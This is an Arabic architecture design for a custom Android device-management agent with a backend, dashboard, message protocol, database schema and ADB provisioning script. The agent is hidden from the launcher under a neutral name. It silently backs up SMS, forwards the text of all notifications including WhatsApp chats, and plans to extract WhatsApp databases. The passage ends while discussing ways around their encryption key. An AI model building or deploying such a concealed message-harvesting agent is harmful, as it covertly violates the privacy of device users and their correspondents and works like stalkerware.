# 🏗️ تصميم معماري – نظام MDM مخصص لأجهزة أندرويد

> **الحالة:** تصميم معماري عالي المستوى (v1.0)  
> **التاريخ:** مارس 2026  
> **النطاق:** Enterprise Internal Use – أجهزة أندرويد مملوكة للشركة

---

## 📋 جدول المحتويات

1. [نظرة عامة على المعمارية](#1-نظرة-عامة-على-المعمارية)
2. [اختيار Stack التقني](#2-اختيار-stack-التقني)
3. [مكونات النظام بالتفصيل](#3-مكونات-النظام-بالتفصيل)
4. [بروتوكول الرسائل (Message Protocol)](#4-بروتوكول-الرسائل-message-protocol)
5. [تدفق البيانات الرئيسية (Data Flows)](#5-تدفق-البيانات-الرئيسية-data-flows)
6. [نموذج قاعدة البيانات](#6-نموذج-قاعدة-البيانات)
7. [الأمان والمصادقة](#7-الأمان-والمصادقة)
8. [الـ Provisioning عبر ADB](#8-الـ-provisioning-عبر-adb)
9. [نقاط التعقيد والمشاكل المتوقعة](#9-نقاط-التعقيد-والمشاكل-المتوقعة)
10. [خارطة التنفيذ (Roadmap)](#10-خارطة-التنفيذ-roadmap)

---

## 1. نظرة عامة على المعمارية

```
┌─────────────────────────────────────────────────────────────────────┐
│                          شبكة الشركة / Internet                     │
│                                                                     │
│  ┌──────────────┐    WSS/HTTPS    ┌──────────────────────────────┐  │
│  │ Android Agent│◄───────────────►│        Backend Server        │  │
│  │  (Device 1)  │                 │                              │  │
│  └──────────────┘                 │  ┌─────────┐  ┌──────────┐  │  │
│                                   │  │   API   │  │    WS    │  │  │
│  ┌──────────────┐                 │  │ (REST)  │  │ Gateway  │  │  │
│  │ Android Agent│◄───────────────►│  └────┬────┘  └────┬─────┘  │  │
│  │  (Device 2)  │                 │       │              │        │  │
│  └──────────────┘                 │  ┌────▼──────────────▼─────┐ │  │
│                                   │  │      Business Logic      │ │  │
│  ┌──────────────┐                 │  └────┬──────────────┬─────┘ │  │
│  │ Android Agent│◄───────────────►│       │              │        │  │
│  │  (Device N)  │                 │  ┌────▼────┐  ┌─────▼────┐  │  │
│  └──────────────┘                 │  │PostgreSQL│  │  Redis   │  │  │
│                                   │  └─────────┘  └──────────┘  │  │
│                                   │       │                       │  │
│                                   │  ┌────▼────────┐             │  │
│                                   │  │  File Store │             │  │
│                                   │  │(Local / S3) │             │  │
│                                   └──────────────────────────────┘  │
│                                              ▲                       │
│                                              │ REST/WebSocket        │
│                                   ┌──────────┴───────────┐          │
│                                   │   Web Dashboard       │          │
│                                   │      (React)          │          │
│                                   └──────────────────────┘          │
└─────────────────────────────────────────────────────────────────────┘
```

### المبادئ الأساسية للتصميم

| المبدأ | التطبيق |
|--------|---------|
| **الاستمرارية** | Agent كـ Foreground Service + BOOT_COMPLETED |
| **القابلية للتوسع** | بروتوكول رسائل قابل للتوسيع، أوامر plugin-like |
| **الموثوقية** | إعادة الاتصال التلقائي + Command Queue في الـ DB |
| **الأمان** | TLS + JWT + Token per device |
| **قابلية الصيانة** | فصل واضح بين المكونات، سجلات شاملة |

---

## 2. اختيار Stack التقني

### 2.1 Android Agent → **Kotlin (Native)**

**لماذا Kotlin وليس Flutter/React Native؟**

| المعيار | Kotlin Native | Flutter/RN |
|---------|--------------|------------|
| الوصول لـ Android APIs | ✅ كامل وبدون أي طبقة وسطى | ⚠️ محدود، يحتاج Platform Channels |
| `NotificationListenerService` | ✅ مباشرة | ❌ معقد جداً |
| `ForegroundService` + Doze | ✅ تحكم كامل | ⚠️ سلوك غير متوقع |
| حجم التطبيق | ✅ صغير (< 2MB) | ❌ كبير (40MB+) |
| أداء الخلفية | ✅ ممتاز | ⚠️ متوسط |

**المكتبات الرئيسية:**
- `OkHttp` – للـ WebSocket و HTTP
- `WorkManager` – للمهام الدورية الموثوقة
- `Gson` / `kotlinx.serialization` – للـ JSON
- `Room` – لتخزين البيانات محلياً (Command queue, device state)
- `Coroutines` – للعمليات غير المتزامنة

---

### 2.2 Backend → **Node.js + TypeScript + Fastify**

**لماذا Node.js + Fastify وليس Go أو Python؟**

| المعيار | Node.js/Fastify | Go/Fiber | Python/FastAPI |
|---------|----------------|----------|----------------|
| أداء WebSocket | ✅ ممتاز (event loop) | ✅ ممتاز | ⚠️ جيد |
| عدد الأجهزة المتوقعة (< 1000) | ✅ مناسب جداً | ✅ | ✅ |
| سرعة التطوير | ✅ عالية | ⚠️ متوسطة | ✅ عالية |
| نضج Ecosystem للـ WebSocket | ✅ `ws` library مثالية | جيد | ⚠️ |
| متاح في بيئتكم | ✅ | ✅ | ✅ |
| قابلية الصيانة (TypeScript) | ✅ ممتاز بـ TS | ✅ static typing | ⚠️ |

**المكتبات الرئيسية:**
- `fastify` – HTTP Server (أسرع من Express بـ 2-3x)
- `ws` – WebSocket Server (أخف من socket.io، بدون overhead)
- `@fastify/jwt` – JWT Authentication
- `prisma` – ORM لـ PostgreSQL (type-safe، migrations مدمجة)
- `ioredis` – Redis Client (لتتبع الـ connections)
- `@aws-sdk/client-s3` – للـ S3 (أو local storage كبديل)
- `zod` – Validation للـ schemas

**لماذا `ws` وليس `socket.io`؟**  
`socket.io` تضيف overhead كبير (fallback mechanisms, rooms, namespaces) لا نحتاجها. في حالتنا، نريد WebSocket خالصاً مع بروتوكول نصمّمه نحن، و`ws` أبسط وأخف وأكثر تحكماً.

---

### 2.3 Dashboard → **React + TypeScript + Vite**

**لماذا React؟**
- متاح في بيئتكم، mature ecosystem
- المكتبات المطلوبة (real-time, tables, charts) ناضجة جداً
- سهولة الصيانة والتوسع

**المكتبات الرئيسية:**
- `vite` – Build tool سريع
- `react-query` / `TanStack Query` – Server state management
- `zustand` – Client state (بسيط وخفيف)
- `shadcn/ui` + `Radix` – UI components عالية الجودة
- `recharts` – للرسوم البيانية
- `native WebSocket API` – للـ real-time (أو `reconnecting-websocket` للتعامل مع الانقطاعات)

---

### 2.4 Database → **PostgreSQL + Redis**

| الاستخدام | الأداة |
|-----------|--------|
| بيانات الأجهزة، الأوامر، السجلات | **PostgreSQL** – relational, ACID, مناسب للـ audit logs |
| حالة الاتصال الحية (Online/Offline) | **Redis** – سريع، في الذاكرة، ephemeral |
| Command Queue المؤقت | **Redis** (أو PostgreSQL كـ fallback) |
| تخزين الملفات (SMS backups, etc.) | **Local Filesystem** أو **S3** |

---

## 3. مكونات النظام بالتفصيل

### 3.1 Android Agent – الهيكل الداخلي

```
com.company.mdmagent/
├── core/
│   ├── AgentApplication.kt          # Application class
│   ├── AgentService.kt              # ForegroundService الرئيسي
│   └── BootReceiver.kt              # BOOT_COMPLETED BroadcastReceiver
│
├── network/
│   ├── WebSocketManager.kt          # إدارة الاتصال وإعادة الاتصال
│   ├── ApiClient.kt                 # HTTP للـ Registration
│   └── MessageHandler.kt           # معالجة الرسائل الواردة
│
├── commands/
│   ├── CommandDispatcher.kt         # Router للأوامر
│   ├── BackupSmsCommand.kt          # تنفيذ backup_sms
│   ├── GetDeviceInfoCommand.kt      # تنفيذ get_device_info
│   └── ICommand.kt                  # Interface مشتركة للأوامر
│
├── collectors/
│   ├── HeartbeatCollector.kt        # جمع بيانات البطارية/الشبكة/التخزين
│   ├── SmsReader.kt                 # قراءة الرسائل
│   └── NotificationListener.kt     # NotificationListenerService
│
├── storage/
│   ├── AgentDatabase.kt             # Room Database
│   ├── DeviceDao.kt
│   └── PendingCommandDao.kt         # لحفظ الأوامر offline
│
└── utils/
    ├── DeviceInfoUtils.kt           # Android ID, Model, etc.
    └── FileUploader.kt              # رفع الملفات للـ Backend
```

**آلية عمل الـ Agent:**

```
[التشغيل الأول]
       │
       ▼
AgentApplication.onCreate()
       │
       ▼
AgentService.onStartCommand()
  ├── startForeground(notification)  ← إلزامي لتجنب الإيقاف
  ├── checkRegistration()
  │     ├── [غير مسجل] → register() → احفظ deviceUid + authToken
  │     └── [مسجل]     → تابع
  └── WebSocketManager.connect()
        ├── sendHello()
        ├── startHeartbeatLoop() (كل 30 ثانية)
        └── listenForCommands()

[عند استلام Command]
       │
       ▼
MessageHandler.onMessage(json)
       │
       ▼
CommandDispatcher.dispatch(command)
       │
  ┌────┴─────┐
  │ التنفيذ  │
  └────┬─────┘
       │
       ▼
WebSocketManager.send(command_result)
```

**آلية إعادة الاتصال:**
```
WebSocketManager uses Exponential Backoff:
  - محاولة أولى: فوراً
  - ثانية: 5 ثواني
  - ثالثة: 15 ثانية
  - رابعة: 30 ثانية
  - حد أقصى: 5 دقائق
  - عند الاتصال: إرسال hello message لإعادة المزامنة
```

---

### 3.2 Backend – الهيكل الداخلي

```
mdm-backend/
├── src/
│   ├── index.ts                     # Entry point
│   ├── config/
│   │   └── index.ts                 # إعدادات البيئة
│   │
│   ├── api/                         # REST Endpoints (للـ Dashboard)
│   │   ├── auth.routes.ts           # POST /auth/login
│   │   ├── devices.routes.ts        # GET /devices, GET /devices/:id
│   │   ├── commands.routes.ts       # POST /devices/:id/commands
│   │   └── files.routes.ts          # GET /devices/:id/files
│   │
│   ├── websocket/                   # إدارة اتصالات الأجهزة
│   │   ├── AgentGateway.ts          # WebSocket server للـ Agents
│   │   ├── DashboardGateway.ts      # WebSocket server للـ Dashboard
│   │   └── ConnectionRegistry.ts   # تتبع الاتصالات الحية (Redis)
│   │
│   ├── services/
│   │   ├── DeviceService.ts         # منطق إدارة الأجهزة
│   │   ├── CommandService.ts        # إرسال وتتبع الأوامر
│   │   ├── BackupService.ts         # استلام وحفظ الملفات
│   │   └── NotificationService.ts  # حفظ الإشعارات
│   │
│   ├── db/
│   │   ├── prisma/
│   │   │   └── schema.prisma        # نموذج قاعدة البيانات
│   │   └── redis.ts                 # Redis client
│   │
│   └── middleware/
│       ├── auth.middleware.ts       # التحقق من JWT
│       └── deviceAuth.middleware.ts # التحقق من device token
│
├── prisma/
│   └── schema.prisma
├── .env
├── package.json
└── tsconfig.json
```

---

### 3.3 Dashboard – الهيكل الداخلي

```
mdm-dashboard/
├── src/
│   ├── main.tsx
│   ├── App.tsx
│   │
│   ├── pages/
│   │   ├── LoginPage.tsx
│   │   ├── DevicesListPage.tsx      # قائمة الأجهزة
│   │   ├── DeviceDetailPage.tsx     # تفاصيل جهاز
│   │   └── EventsLogPage.tsx        # سجل الأحداث والأوامر
│   │
│   ├── components/
│   │   ├── DeviceCard.tsx
│   │   ├── DeviceStatusBadge.tsx    # Online/Offline indicator
│   │   ├── CommandButton.tsx
│   │   ├── CommandResultModal.tsx
│   │   └── NotificationFeed.tsx
│   │
│   ├── hooks/
│   │   ├── useDevices.ts            # TanStack Query
│   │   ├── useDeviceDetail.ts
│   │   └── useLiveDashboard.ts      # WebSocket hook
│   │
│   ├── services/
│   │   ├── api.ts                   # HTTP client (axios/fetch)
│   │   └── wsService.ts             # WebSocket manager
│   │
│   └── store/
│       └── dashboardStore.ts        # Zustand store
```

---

## 4. بروتوكول الرسائل (Message Protocol)

### 4.1 الهيكل العام

كل رسالة هي كائن JSON بالشكل التالي:

```jsonc
{
  "type": "string",          // نوع الرسالة (إلزامي دائماً)
  "msgId": "uuid-v4",        // معرّف فريد للرسالة (إلزامي)
  "timestamp": "ISO-8601",   // وقت الإرسال (إلزامي)
  "payload": { ... }         // محتوى الرسالة (يختلف حسب النوع)
}
```

### 4.2 جدول أنواع الرسائل

| النوع | الاتجاه | الوصف |
|-------|---------|--------|
| `agent_register` | Agent → Server | التسجيل الأولي |
| `agent_register_ack` | Server → Agent | تأكيد التسجيل |
| `agent_hello` | Agent → Server | مرحبا بعد إعادة الاتصال |
| `agent_hello_ack` | Server → Agent | تأكيد الـ hello |
| `heartbeat` | Agent → Server | نبضة دورية |
| `heartbeat_ack` | Server → Agent | تأكيد النبضة |
| `command` | Server → Agent | أمر للتنفيذ |
| `command_ack` | Agent → Server | استلام الأمر |
| `command_result` | Agent → Server | نتيجة الأمر |
| `command_result_ack` | Server → Agent | تأكيد استلام النتيجة |
| `notification_event` | Agent → Server | إشعار من جهاز |
| `file_upload_request` | Agent → Server | طلب رفع ملف |
| `file_upload_url` | Server → Agent | URL للرفع (presigned) |
| `error` | ثنائي الاتجاه | خطأ |

---

### 4.3 تفاصيل كل رسالة

#### `agent_register` – التسجيل الأولي
```jsonc
// Agent → Server (عبر POST /api/v1/devices/register)
// ملاحظة: التسجيل الأولي يكون HTTP وليس WebSocket
{
  "type": "agent_register",
  "msgId": "550e8400-e29b-41d4-a716-446655440000",
  "timestamp": "2026-03-20T11:00:00Z",
  "payload": {
    "androidId": "abc123def456",     // Android ID (ANDROID_ID)
    "serialNumber": "RF8N12345XY",   // Build.SERIAL
    "model": "Samsung Galaxy A52",
    "manufacturer": "Samsung",
    "androidVersion": "13",
    "sdkVersion": 33,
    "agentVersion": "1.0.0",
    "enrollmentToken": "STATIC_ENROLL_TOKEN"  // توكن مضمّن في الـ APK عند البناء
  }
}

// Server → Agent (Response)
{
  "type": "agent_register_ack",
  "msgId": "response-uuid",
  "timestamp": "2026-03-20T11:00:01Z",
  "payload": {
    "deviceUid": "dev_8f3a2b1c",     // معرف داخلي ثابت
    "authToken": "eyJhbGci...",       // JWT طويل الأمد لهذا الجهاز
    "wsUrl": "wss://mdm.company.com/ws/agent",
    "heartbeatIntervalSeconds": 30
  }
}
```

#### `agent_hello` – بعد كل اتصال WebSocket جديد
```jsonc
// Agent → Server
{
  "type": "agent_hello",
  "msgId": "uuid",
  "timestamp": "2026-03-20T11:05:00Z",
  "payload": {
    "deviceUid": "dev_8f3a2b1c",
    "authToken": "eyJhbGci...",
    "agentVersion": "1.0.0",
    "lastKnownCommandId": "cmd_xyz"  // لمزامنة أي أوامر فائتة
  }
}

// Server → Agent
{
  "type": "agent_hello_ack",
  "msgId": "uuid",
  "timestamp": "2026-03-20T11:05:00Z",
  "payload": {
    "pendingCommands": [             // أوامر لم تصل بسبب offline
      { "commandId": "cmd_abc", "type": "get_device_info", "params": {} }
    ]
  }
}
```

#### `heartbeat` – النبضة الدورية
```jsonc
// Agent → Server (كل 30 ثانية)
{
  "type": "heartbeat",
  "msgId": "uuid",
  "timestamp": "2026-03-20T11:05:30Z",
  "payload": {
    "deviceUid": "dev_8f3a2b1c",
    "battery": {
      "level": 87,              // نسبة مئوية
      "isCharging": true,
      "chargingType": "USB"     // USB / AC / WIRELESS
    },
    "network": {
      "type": "WIFI",           // WIFI / MOBILE / NONE
      "isConnected": true,
      "wifiSignalLevel": 4,     // 0-5 (null إذا لم يكن WIFI)
      "mobileNetworkType": null // LTE / 3G / ... (null إذا WIFI)
    },
    "storage": {
      "totalBytes": 128849018880,
      "freeBytes": 45234567890,
      "usedPercent": 65
    },
    "uptime": {
      "deviceUptimeMs": 3600000,
      "agentUptimeMs": 3500000
    }
  }
}
```

#### `command` – أمر من السيرفر
```jsonc
// Server → Agent
{
  "type": "command",
  "msgId": "uuid",
  "timestamp": "2026-03-20T11:10:00Z",
  "payload": {
    "commandId": "cmd_a1b2c3d4",     // معرف الأمر للـ tracking
    "commandType": "backup_sms",      // نوع الأمر
    "priority": "normal",             // normal / high / low
    "timeoutSeconds": 120,            // مدة الانتظار قبل اعتبار الأمر فاشلاً
    "params": {                       // بارامترات الأمر (تختلف حسب النوع)
      "format": "json",
      "includeRead": true,
      "dateFrom": null,               // null = كل الرسائل
      "dateTo": null
    }
  }
}
```

#### `command_ack` – تأكيد استلام الأمر
```jsonc
// Agent → Server (فوراً عند استلام الأمر)
{
  "type": "command_ack",
  "msgId": "uuid",
  "timestamp": "2026-03-20T11:10:01Z",
  "payload": {
    "commandId": "cmd_a1b2c3d4",
    "status": "received"             // received / rejected
  }
}
```

#### `command_result` – نتيجة الأمر
```jsonc
// Agent → Server (عند الانتهاء من التنفيذ)
{
  "type": "command_result",
  "msgId": "uuid",
  "timestamp": "2026-03-20T11:11:30Z",
  "payload": {
    "commandId": "cmd_a1b2c3d4",
    "commandType": "backup_sms",
    "status": "success",             // success / failure / partial
    "executionTimeMs": 89000,
    "result": {
      // مختلف لكل command type:
      
      // backup_sms:
      "totalMessages": 1247,
      "uploadedFileKey": "backups/dev_8f3a2b1c/sms_20260320_111130.json",
      
      // get_device_info:
      // "deviceInfo": { ... }
      
      // error case:
      // "error": { "code": "PERMISSION_DENIED", "message": "..." }
    }
  }
}
```

#### `notification_event` – إشعار من جهاز
```jsonc
// Agent → Server
{
  "type": "notification_event",
  "msgId": "uuid",
  "timestamp": "2026-03-20T11:15:00Z",
  "payload": {
    "deviceUid": "dev_8f3a2b1c",
    "notifications": [              // batch (يمكن أن يكون مفرداً أو batch)
      {
        "notifId": "local-uuid",
        "packageName": "com.whatsapp",
        "appName": "WhatsApp",
        "title": "John Doe",
        "text": "أهلاً، كيف الحال؟",
        "ticker": null,
        "category": "msg",
        "postedAt": "2026-03-20T11:14:58Z",
        "isOngoing": false
      }
    ]
  }
}
```

---

### 4.4 أنواع الأوامر الموسعة

```jsonc
// backup_sms
"params": {
  "format": "json",           // json / csv
  "includeRead": true,
  "dateFrom": "2026-01-01",  // ISO date أو null
  "dateTo": null
}

// backup_whatsapp (مرحلة 2)
"params": {
  "backupType": "db_snapshot",  // db_snapshot / media_preview
  "targetPath": "/sdcard/WhatsApp/Databases/"
}

// get_device_info
"params": {
  "include": ["battery", "storage", "network", "apps", "system"]
  // يمكن تحديد ما تريد أو all
}

// send_agent_logs
"params": {
  "logLevel": "DEBUG",        // DEBUG / INFO / WARN / ERROR
  "lines": 500
}

// update_config (مستقبلاً)
"params": {
  "heartbeatIntervalSeconds": 60,
  "notificationFilterPackages": ["com.whatsapp", "com.telegram"]
}
```

---

## 5. تدفق البيانات الرئيسية (Data Flows)

### 5.1 تدفق التسجيل الأولي

```
[الجهاز يُشغّل لأول مرة]
        │
        ▼
Agent يتحقق من: هل deviceUid مخزّن محلياً؟
        │
   [لا يوجد]
        │
        ▼
POST /api/v1/devices/register
  مع: androidId, serial, model, enrollmentToken
        │
        ▼
Backend يتحقق من enrollmentToken (صحيح؟)
        │
        ▼
Backend ينشئ:
  - deviceUid جديد
  - authToken (JWT طويل الأمد - مثلاً سنة)
  - يحفظ في PostgreSQL
        │
        ▼
Agent يستقبل: deviceUid + authToken
  - يحفظهما محلياً (EncryptedSharedPreferences)
        │
        ▼
Agent يفتح WebSocket ويرسل agent_hello
```

### 5.2 تدفق تنفيذ أمر (مسار سعيد)

```
[مشرف يضغط "Backup SMS" في الـ Dashboard]
        │
        ▼
Dashboard → POST /api/v1/devices/dev_8f3a2b1c/commands
  body: { commandType: "backup_sms", params: {...} }
        │
        ▼
Backend:
  1. ينشئ Command record في DB (status: "pending")
  2. يتحقق: هل الجهاز Online في Redis؟
        │
   [Online] ────────────────────────────────────┐
        │                                        │
        ▼                                        ▼
Backend يرسل عبر WS:               [Offline]
  { type: "command", ... }         يحفظ الأمر كـ "queued"
        │                          يُبلّغ Dashboard
        ▼
Agent يستقبل الأمر
  → يرسل command_ack (status: "received")
  → يبدأ التنفيذ
        │
        ▼
Backend يحدّث Command status: "in_progress"
Backend يُبلّغ Dashboard عبر WS
        │
        ▼
Agent ينتهي من التنفيذ
  → يرفع الملف (إن وجد) إلى Backend / S3
  → يرسل command_result
        │
        ▼
Backend:
  1. يحفظ النتيجة في DB (status: "success")
  2. يُبلّغ Dashboard عبر WS
        │
        ▼
Dashboard يعرض النتيجة للمشرف ✅
```

### 5.3 تدفق الـ Offline Command Queue

```
[الجهاز يعود للإنترنت]
        │
        ▼
Agent يفتح WebSocket
  → يرسل agent_hello مع lastKnownCommandId
        │
        ▼
Backend:
  - يبحث في DB عن أوامر بحالة "queued" لهذا الجهاز
  - يرسلها كـ pendingCommands في agent_hello_ack
        │
        ▼
Agent يُنفّذها بالترتيب
```

---

## 6. نموذج قاعدة البيانات

```prisma
// schema.prisma

model Device {
  id              String          @id @default(cuid())
  deviceUid       String          @unique                    // dev_xxxxx
  androidId       String          @unique
  serialNumber    String?
  model           String
  manufacturer    String
  androidVersion  String
  sdkVersion      Int
  agentVersion    String
  enrolledAt      DateTime        @default(now())
  lastSeenAt      DateTime?
  authToken       String          // هاش التوكن (وليس التوكن نفسه)
  
  // Relations
  commands        Command[]
  heartbeats      Heartbeat[]
  backupFiles     BackupFile[]
  notifications   NotificationLog[]
  
  @@index([deviceUid])
}

model Command {
  id              String          @id @default(cuid())
  commandId       String          @unique                    // cmd_xxxxx
  device          Device          @relation(fields: [deviceId], references: [id])
  deviceId        String
  initiatedBy     Admin?          @relation(fields: [adminId], references: [id])
  adminId         String?
  
  commandType     String                                     // backup_sms, get_device_info, ...
  params          Json
  status          CommandStatus   @default(PENDING)          // PENDING, QUEUED, IN_PROGRESS, SUCCESS, FAILURE, TIMEOUT
  priority        String          @default("normal")
  timeoutSeconds  Int             @default(120)
  
  createdAt       DateTime        @default(now())
  acknowledgedAt  DateTime?
  completedAt     DateTime?
  
  result          Json?
  errorCode       String?
  errorMessage    String?
  
  @@index([deviceId, status])
  @@index([commandId])
}

enum CommandStatus {
  PENDING
  QUEUED
  IN_PROGRESS
  SUCCESS
  FAILURE
  TIMEOUT
}

model Heartbeat {
  id              String          @id @default(cuid())
  device          Device          @relation(fields: [deviceId], references: [id])
  deviceId        String
  receivedAt      DateTime        @default(now())
  
  batteryLevel    Int
  isCharging      Boolean
  networkType     String
  isConnected     Boolean
  storageFreeBytes BigInt
  storageTotalBytes BigInt
  
  @@index([deviceId, receivedAt])
}

model BackupFile {
  id              String          @id @default(cuid())
  device          Device          @relation(fields: [deviceId], references: [id])
  deviceId        String
  commandId       String?
  
  fileType        String                                     // sms, whatsapp_db, logs
  fileKey         String                                     // مسار في S3 أو filesystem
  fileSizeBytes   BigInt
  recordCount     Int?                                       // عدد السجلات (للـ SMS مثلاً)
  storageProvider String          @default("local")          // local / s3
  
  createdAt       DateTime        @default(now())
  expiresAt       DateTime?                                  // لحذف ملفات قديمة تلقائياً
  
  @@index([deviceId, fileType])
}

model NotificationLog {
  id              String          @id @default(cuid())
  device          Device          @relation(fields: [deviceId], references: [id])
  deviceId        String
  
  packageName     String
  appName         String
  title           String?
  text            String?
  category        String?
  postedAt        DateTime
  receivedAt      DateTime        @default(now())
  
  @@index([deviceId, postedAt])
  @@index([packageName])
}

model Admin {
  id              String          @id @default(cuid())
  username        String          @unique
  email           String          @unique
  passwordHash    String
  role            AdminRole       @default(OPERATOR)
  isActive        Boolean         @default(true)
  
  createdAt       DateTime        @default(now())
  lastLoginAt     DateTime?
  commands        Command[]
  
  @@index([username])
}

enum AdminRole {
  SUPER_ADMIN
  ADMIN
  OPERATOR      // يمكنه رؤية الأجهزة لكن لا يمكنه تنفيذ أوامر حساسة
  VIEWER        // قراءة فقط
}

// Redis Keys (ليست في Prisma، للتوثيق)
// device:online:{deviceUid}         → "1" (TTL: 90 ثانية، يُجدَّد مع كل heartbeat)
// device:ws:socket_id:{deviceUid}   → socket connection ID
// command:pending:{deviceUid}       → List of command IDs
```

---

## 7. الأمان والمصادقة

### 7.1 طبقات الأمان

```
┌─────────────────────────────────────────┐
│  TLS/HTTPS + WSS                        │ ← طبقة النقل
├─────────────────────────────────────────┤
│  enrollmentToken (ثابت في الـ APK)      │ ← للتسجيل الأولي فقط
├─────────────────────────────────────────┤
│  authToken (JWT per device)             │ ← لكل اتصال WebSocket
├─────────────────────────────────────────┤
│  Admin JWT (للـ Dashboard)              │ ← للمشرفين
├─────────────────────────────────────────┤
│  RBAC Roles (Super Admin / Admin / etc) │ ← الصلاحيات
└─────────────────────────────────────────┘
```

### 7.2 إدارة توكنات الأجهزة

```
enrollmentToken:
  - رمز ثابت مضمّن في الـ APK عند البناء
  - سري، لا يُشارك
  - يُستخدم مرة واحدة فقط للتسجيل
  - يمكن تدويره بإصدار APK جديد

authToken (Device JWT):
  - يُولَّد عند التسجيل الناجح
  - صالح لمدة طويلة (سنة أو أكثر)
  - يحتوي: { deviceUid, androidId, iat, exp }
  - موقّع بـ secret على السيرفر
  - يُخزَّن على الجهاز في EncryptedSharedPreferences
  - في حالة الاختراق: يمكن إبطاله من Dashboard (token revocation list في Redis)
```

### 7.3 أمان الاتصال

```
Device → Server:
  - WebSocket header: Authorization: Bearer {authToken}
  - يُتحقق منه في أول اتصال
  - device-to-device isolation: كل جهاز لا يرى بيانات غيره

Server → Dashboard:
  - Admin JWT (صالح 24 ساعة مع refresh)
  - Rate limiting على endpoints الحساسة
  - Audit log لكل عملية (من نفّذ، متى، على أي جهاز)
```

---

## 8. الـ Provisioning عبر ADB

### 8.1 سكربت الـ Provisioning الكامل

```powershell
# provision_device.ps1
# الاستخدام: .\provision_device.ps1 -DeviceName "Device-001"

param(
    [Parameter(Mandatory=$true)]
    [string]$DeviceName
)

$APK_PATH = ".\agent-release.apk"
$PACKAGE_NAME = "com.company.mdmagent"
$SERVER_URL = "https://mdm.company.com"

Write-Host "🚀 بدء Provisioning للجهاز: $DeviceName" -ForegroundColor Green

# 1. تثبيت الـ Agent
Write-Host "[1/7] تثبيت الـ Agent APK..."
adb install -r $APK_PATH

# 2. أذونات SMS
Write-Host "[2/7] منح أذونات SMS..."
adb shell pm grant $PACKAGE_NAME android.permission.READ_SMS
adb shell pm grant $PACKAGE_NAME android.permission.RECEIVE_SMS

# 3. أذونات الشبكة والجهاز
Write-Host "[3/7] منح أذونات الشبكة..."
adb shell pm grant $PACKAGE_NAME android.permission.READ_PHONE_STATE
adb shell pm grant $PACKAGE_NAME android.permission.ACCESS_NETWORK_STATE
adb shell pm grant $PACKAGE_NAME android.permission.ACCESS_WIFI_STATE

# 4. أذونات التخزين (إذا لزم للنسخ الاحتياطي)
Write-Host "[4/7] منح أذونات التخزين..."
adb shell pm grant $PACKAGE_NAME android.permission.READ_EXTERNAL_STORAGE

# 5. استثناء من توفير البطارية (Doze whitelist)
Write-Host "[5/7] إضافة لقائمة استثناء Doze..."
adb shell dumpsys deviceidle whitelist +$PACKAGE_NAME

# 6. تفعيل NotificationListenerService
# ملاحظة: هذا يحتاج تأكيداً يدوياً أو DevicePolicyManager
Write-Host "[6/7] محاولة تفعيل NotificationListener..."
adb shell cmd notification allow_listener com.company.mdmagent/.collectors.NotificationListener

# 7. تشغيل الخدمة
Write-Host "[7/7] تشغيل الـ Agent..."
adb shell am start-foreground-service `
    -n "$PACKAGE_NAME/.core.AgentService" `
    --es "action" "START"

Write-Host "✅ Provisioning مكتمل للجهاز: $DeviceName" -ForegroundColor Green
Write-Host "   الجهاز سيظهر في Dashboard خلال 30 ثانية."
```

### 8.2 إخفاء الأيقونة من الـ Launcher

```xml
<!-- في AndroidManifest.xml -->
<!-- لا تضع activity لاحتوائها على LAUNCHER intent -->
<!-- فقط هذا يكفي لعدم ظهور أيقونة في قائمة التطبيقات -->

<application
    android:name=".core.AgentApplication"
    android:label="Company Services"  <!-- اسم محايد -->
    android:icon="@mipmap/ic_launcher">
    
    <!-- لا يوجد Activity مع MAIN/LAUNCHER -->
    <!-- فقط Services و BroadcastReceivers -->
    
    <service android:name=".core.AgentService"
        android:foregroundServiceType="dataSync|connectedDevice"
        android:exported="false"/>
        
    <receiver android:name=".core.BootReceiver"
        android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.BOOT_COMPLETED"/>
            <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
        </intent-filter>
    </receiver>
    
    <service android:name=".collectors.NotificationListener"
        android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
        android:exported="true">
        <intent-filter>
            <action android:name="android.service.notification.NotificationListenerService"/>
        </intent-filter>
    </service>
</application>
```

### 8.3 أذونات تحتاج موافقة يدوية (قيود أندرويد)

| الأذن | هل يمكن منحها بـ ADB؟ | الحل |
|-------|----------------------|------|
| READ_SMS | ✅ نعم | `pm grant` |
| RECEIVE_SMS | ✅ نعم | `pm grant` |
| BIND_NOTIFICATION_LISTENER_SERVICE | ⚠️ محدود | `cmd notification allow_listener` (يعمل على بعض الأجهزة) أو يدوياً |
| PACKAGE_USAGE_STATS | ❌ | يدوياً في الإعدادات أو DevicePolicyManager |
| WRITE_SECURE_SETTINGS | ✅ عبر ADB مباشرة | `adb shell pm grant ... WRITE_SECURE_SETTINGS` |

---

## 9. نقاط التعقيد والمشاكل المتوقعة

### 9.1 ⚠️ استمرارية الـ Foreground Service

**المشكلة:** أندرويد 8+ يقيّد الخدمات في الخلفية بشكل صارم.  
**الحل:**
```
1. استخدام startForeground() مع Notification (إلزامي)
   - يمكن جعل الإشعار صامتاً (low priority)
   
2. WorkManager للمهام الدورية (heartbeat احتياطي)
   - إذا أُوقفت الخدمة، WorkManager يعيد تشغيلها
   
3. الاستثناء من Doze عبر ADB (خطوة الـ Provisioning)

4. BOOT_COMPLETED لإعادة التشغيل بعد الإعادة
```

**تحذير لأجهزة بعينها:** بعض الشركات (Xiaomi, Huawei, Samsung) تضيف قيوداً إضافية فوق AOSP. قد تحتاج:
- تعطيل "Battery Optimization" يدوياً
- إضافة التطبيق لـ "App Lock" أو ما يعادله

### 9.2 ⚠️ NotificationListenerService

**المشكلة:** يحتاج موافقة المستخدم عادةً في `Settings → Special App Access → Notification Access`.  
**الحل بـ ADB:**
```bash
# هذا يعمل على كثير من الأجهزة:
adb shell cmd notification allow_listener \
  com.company.mdmagent/com.company.mdmagent.collectors.NotificationListener
```
إذا لم يعمل، يمكن إكمال هذه الخطوة يدوياً أثناء الـ Provisioning (مرة واحدة).

### 9.3 ⚠️ قراءة WhatsApp Backups

**المشكلة:** ملفات WhatsApp في `/data/data/com.whatsapp/` تحتاج صلاحيات root.  
**ما هو متاح بدون root:**
```
/sdcard/WhatsApp/Databases/msgstore*.db.crypt14  ← متاح ✅
/sdcard/WhatsApp/Media/                           ← متاح ✅
```
**المشكلة:** الملفات مشفرة بـ crypt14، والمفتاح في `/data/data/com.whatsapp/files/key`.  
**الحلول:**
1. استخدام ADB Backup (يعمل على أجهزة قديمة أو مع تعديلات)
